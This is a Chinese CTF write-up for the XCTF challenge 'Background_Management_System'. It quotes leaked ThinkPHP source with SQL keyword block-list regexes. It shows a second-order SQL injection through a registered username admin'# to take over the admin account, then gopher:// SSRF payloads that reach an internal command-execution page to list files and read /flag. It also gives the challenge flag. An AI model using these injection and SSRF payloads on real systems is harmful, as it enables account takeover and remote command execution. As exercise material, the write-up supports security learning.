# Background_Management_System

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=0b1a9c16-517e-4059-b754-ac2c7d546527_2)

知识点倒是都见过，就是不熟。

进入网站，出题人写了友情提示。

1. 如果你不是网站管理员请速速离开！！！
2. 我才不会愚蠢到把秘密放到数据库里呢:)
3. 关键字我都过滤啦，天啊我好坏:)

如果这些提示是真的，我们的目标就是拿到管理员账号，并且不要想着用sql注入搞出flag。信不信呢？有很多题故意说反话，先放在这。随便注册一个账号，提示可以去个人中心。个人中心里又有新的提示。

- This is your hint:
<br>flag{}
<Br>maybe the admin have some hints:)

看来友情提示的第一条没错，就是要拿到管理员账号。不知道怎么办，一言不合扫目录。扫到www.zip，发现很多源码泄露都是这个url啊，以后直接去这里。不过这次不在根目录下。

- http://61.147.171.105:53561/xinan/public/www.zip

我恨源码审计，但好像不给源码更烦。先看注册。

```php
<?php

namespace app\index\controller;

use think\Controller;
use think\Db;
use think\Request;
use think\Validate;

class Register extends Controller
{
    public function create()
    {
        //halt('hello');
        return view();
    }

    public function add(Request $request)
    {
        $dbuser ='*****';
        $dbpass ='*****';
        $dbname ="study";
        $host = 'localhost';
        @error_reporting(0);
        @$con = mysqli_connect($host,$dbuser,$dbpass,$dbname);
        // Check connection
        if (!$con)
        {
            echo "Failed to connect to MySQL: " . mysqli_error();
        }
        @mysqli_select_db($con,$dbname) or die ( "Unable to connect to the database: $dbname");


        $post = $request->post();
        $validate = Validate::make(['password'=>'require|min:3|max:40|confirm','username'=>'require|min:3|max:40']);
        $status = $validate->check($post);
        $username=  $post['username'];
        $pass= mysqli_real_escape_string($con,$post['password']);
        if($status) {
            if (preg_match("/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i", $username) || preg_match("/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i", $pass)) {
            $this->success('go out!! hacker','/xinan/public/index/index/index');
        } else {
                $relogin = Db::table('users')->where('username',$post['username'])->find();
                if ($relogin){
                    return "<script>alert('该用户名已被注册');window.location.href='/xinan/public/index/register/create'; </script>";
                }else{
                    $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
                    $result = mysqli_query($con,"insert into users ( username, password) values(\"$username\", \"$pass\")") or die('Error Creating your user account,  : '.mysqli_error());
                    if($result){
                        $this->success('注册成功 快去登陆吧','/xinan/public/index/login/index');
                    }else{
                        $this->error('注册失败，请联系管理员');
                    }
                }
            }
        }
        else{
            $this->error($validate->getError());
        }
    }
}
```

这个正则确实狠。还能干啥，看看登陆。

```php
<?php

namespace app\index\controller;

use think\Controller;
use think\Db;
use think\Request;
use think\Validate;

class Login extends Controller
{
    public function index()
    {
        return view();
    }

    public function login(Request $request)
    {
    	$dbuser ='*****';
        $dbpass ='*****';
        $dbname ="study";
        $host = 'localhost';
        @error_reporting(0);
        @$con = mysqli_connect($host,$dbuser,$dbpass,$dbname);
        // Check connection
        if (!$con)
        {
            echo "Failed to connect to MySQL: " . mysqli_error();
        }
        @mysqli_select_db($con,$dbname) or die ( "Unable to connect to the database: $dbname");
        $post = $request->post();
        $username = mysqli_real_escape_string($con,$post["username"]);
        $password = mysqli_real_escape_string($con,$post["password"]);


        if (preg_match("/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i", $username) || preg_match("/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i", $password)) {
            $this->success('go out!! hacker','/xinan/public/index/index/index');
        } else {
            $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
            $res = mysqli_query($con,$sql) or die('ERROR :(');
            $row = mysqli_fetch_row($res);
            if($row[1]){
            	//var_dump($row);
                cookie('username',$post['username']);
                session('uid',$row[0]);
                session('username',$post['username']);

                $this->success('登陆成功','/xinan/public/index/index/index');
            }else{
                return "<script>alert('账号或密码错误，请重试');window.location.href='/xinan/public/index/login/index'; </script>";
            }
        }
    }

    public function logout()
    {
        session('uid',null);
        session('username',null);
        cookie(null);
        return "<script>alert('已退出登陆');window.location.href='/xinan/public/index/index/index'; </script>";
    }
}
```

这么阴间的过滤sql注入确实毫无用武之地，友情提示是真的。还是没有东西。Userinfo呢？

```php
<?php

namespace app\index\controller;

use think\Controller;
use think\Db;
use think\Request;
use think\Validate;

class Userinfo extends Controller
{
    public function user(Request $request)
    {
        $session = $request->session('username');
        if($session === 'admin')
        {
            return view('user',['info'=>'welcome admin!!','flag'=>'This is your hint:   <br>hint{xxxxxxxxxx}']);
        }
        else{
            return view('user',['info'=>"hello {$session}",'flag'=>'This is your hint:   <br>flag{}<br>maybe the admin have some hints:)']);
        }
    }

    public function change()
    {
        return view();
    }

    public function changeinfo(Request $request)
    {
        $dbuser ='*****';
        $dbpass ='*****';
        $dbname ="study";
        $host = 'localhost';
        @error_reporting(0);
        @$con = mysqli_connect($host,$dbuser,$dbpass,$con);
        // Check connection
        if (!$con)
        {
            echo "Failed to connect to MySQL: " . mysqli_error();
        }
        @mysqli_select_db($con,$dbname) or die ( "Unable to connect to the database: $dbname");


        $post = $request->post();
        $username = $request->session('username');
        $pass = $post['password'];
        $curr_pass = $post['current_password'];
        $validate = Validate::make(['password'=>'min:3|confirm']);
        $status = $validate->check($post);
        if($status){
            if (preg_match("/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i", $curr_pass) || preg_match("/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i", $pass)) {
            $this->success('go out!! hacker','/xinan/public/index/index/index');
            } else {
                $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
                $res = mysqli_query($con,$sql) or die('You tried to be smart, Try harder!!!! :( ');
                $row = mysqli_affected_rows();
                if($row = 1){
                    $this->success('修改成功啦','/xinan/public/index/login/index');
                }else {
                    $this->error('修改失败，请联系管理员');
                }
            }
        }else{
            $this->error($validate->getError());
        }
    }
}
```

还是阴间过滤，但是下方有一句update类型sql语句。虽然在更新之前做了过滤，但忘记过滤了一个很重要的符号：#。某种意义上这是一个二次注入，我们先注册一个admin'#的用户，密码随便。然后登录改密码。此时sql语句就变成了下面这样：

```php
$sql = "UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' ";
```

这样我们改密码时改的其实是admin的密码，下次就能直接登录了。完成一套操作后看看admin账户里有什么。

- This is your hint:
<br>hint{see_55ceedfbc97b0a81277a55506c34af36_php}

访问指定路径。

- http://61.147.171.105:53561/xinan/public/55ceedfbc97b0a81277a55506c34af36.php

提示please get $url。这是ssrf的显著特征啊，想想怎么利用。在源码里翻一通，找到了个shell.php。

```php
 <?php 
echo "这个是内网的操作页面，只允许内网人员使用,get_cmd";
echo "<br />";
if($_SERVER["REMOTE_ADDR"] === "127.0.0.1") 
{ 
    
     
       @eval(system($_GET["cmd"]));
     
} 
else 
      { 
        echo "您的ip是".$_SERVER["REMOTE_ADDR"]."<hr/>"."不是我们的内网机器"."<hr/>"."这是一台内网机器，只接受本机请求"."<hr/>"; 
        return false; 
      } 
```

要求内网。不过没提到用什么协议。看[wp](https://www.freesion.com/article/38341401397/)据说攻防世界少给东西了，原题是有告知过滤了什么协议的，只剩下个gopher能用。之前用过一次，忘了，再查查[资料](https://www.freebuf.com/articles/web/337824.html)。构造payload。

- http://61.147.171.105:53561/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=ls%2B/


flag常规名字。cat就好了。

- http://61.147.171.105:53561/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=cat%2B/flag

gopher发送get报文前面有个_是因为gopher发送过去会吃掉第一个字符，所以最前面那个是故意给协议吃的，用什么都行。需要将报文内容进行url编码，？更是要二次编码成%253F，不知道为啥，可能跟吃第一个字符一样是特性吧。

- ### Flag
  > flag{4e8f794089b6b4ef55cd0399dca1433c}